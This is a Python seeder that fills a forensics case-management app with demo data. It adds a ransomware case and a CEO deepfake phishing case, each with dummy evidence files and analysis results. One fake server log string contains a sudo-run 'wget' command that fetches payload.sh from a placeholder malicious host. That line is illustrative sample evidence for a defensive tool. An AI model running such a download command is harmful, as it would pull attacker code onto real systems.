"""Database Seeder — Pre-populates demo cases and evidence for new users."""

import os
from datetime import datetime, timedelta
from sqlalchemy.orm import Session
from backend.models import Case, Evidence, AnalysisResult

def create_dummy_file(filename: str, content: str = "DUMMY CONTENT") -> str:
    """Creates a dummy file in the uploads directory and returns its path."""
    os.makedirs("uploads", exist_ok=True)
    filepath = os.path.join("uploads", filename)
    if not os.path.exists(filepath):
        with open(filepath, "w") as f:
            f.write(content)
    return filepath

def seed_demo_data(db: Session, user_id: int):
    """Seeds a couple of authentic-looking cases for a new user."""
    
    # 1. Ransomware Case
    case1 = Case(
        case_id="CAS-2026-0801",
        title="Ransomware Incident - AlphaCorp",
        description="Investigation into a suspected ransomware deployment on AlphaCorp's primary file servers.",
        status="Active",
        priority="Critical",
        owner_id=user_id,
        created_at=datetime.utcnow() - timedelta(days=2)
    )
    db.add(case1)
    db.commit()
    db.refresh(case1)

    # Add evidence for case 1
    log_path = create_dummy_file("server_auth_logs.txt", "May 10 14:32:01 server sshd: Accepted password for root from 192.168.1.50\nMay 10 14:32:05 server sudo: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious.ip/payload.sh")
    ev1 = Evidence(
        case_id=case1.id,
        filename="server_auth_logs.txt",
        file_path=log_path,
        sha256_hash="e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        file_type="log",
        uploaded_at=datetime.utcnow() - timedelta(days=1)
    )
    db.add(ev1)
    db.commit()
    db.refresh(ev1)

    # Add analysis result for ev1
    ar1 = AnalysisResult(
        evidence_id=ev1.id,
        module="log_analysis",
        result='{"summary": "Suspicious payload download detected", "findings": [{"severity": "Critical", "category": "Execution", "description": "wget command executed to download unknown payload.sh"}]}',
        risk_score=85,
        created_at=datetime.utcnow() - timedelta(hours=20)
    )
    db.add(ar1)


    # 2. Deepfake Suspect Case
    case2 = Case(
        case_id="CAS-2026-0802",
        title="CEO Impersonation Phishing",
        description="Video evidence submitted by employee claiming the CEO requested an urgent wire transfer.",
        status="Open",
        priority="High",
        owner_id=user_id,
        created_at=datetime.utcnow() - timedelta(days=1)
    )
    db.add(case2)
    db.commit()
    db.refresh(case2)

    # Add evidence for case 2
    video_path = create_dummy_file("ceo_wire_request.mp4", "fake video binary content")
    ev2 = Evidence(
        case_id=case2.id,
        filename="ceo_wire_request.mp4",
        file_path=video_path,
        sha256_hash="a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e",
        file_type="video",
        uploaded_at=datetime.utcnow() - timedelta(hours=10)
    )
    db.add(ev2)
    db.commit()
    db.refresh(ev2)

    # Add analysis result for ev2
    ar2 = AnalysisResult(
        evidence_id=ev2.id,
        module="deepfake_detection",
        result='{"summary": "High probability of AI-generated face manipulation", "findings": [{"severity": "High", "category": "Facial Artifacts", "description": "Unnatural blending boundaries around the jawline detected."}]}',
        risk_score=78,
        created_at=datetime.utcnow() - timedelta(hours=9)
    )
    db.add(ar2)

    db.commit()
